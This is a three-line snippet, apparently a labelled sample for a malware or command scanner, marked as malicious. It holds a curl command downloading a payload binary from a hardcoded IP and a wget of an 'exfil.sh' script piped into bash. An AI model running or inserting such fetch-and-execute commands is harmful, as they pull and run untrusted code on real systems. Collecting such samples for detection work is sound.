# Malicious: fetching from hardcoded IP
curl http://192.168.1.100/payload.bin -o /tmp/payload
wget http://10.0.0.1/exfil.sh | bash
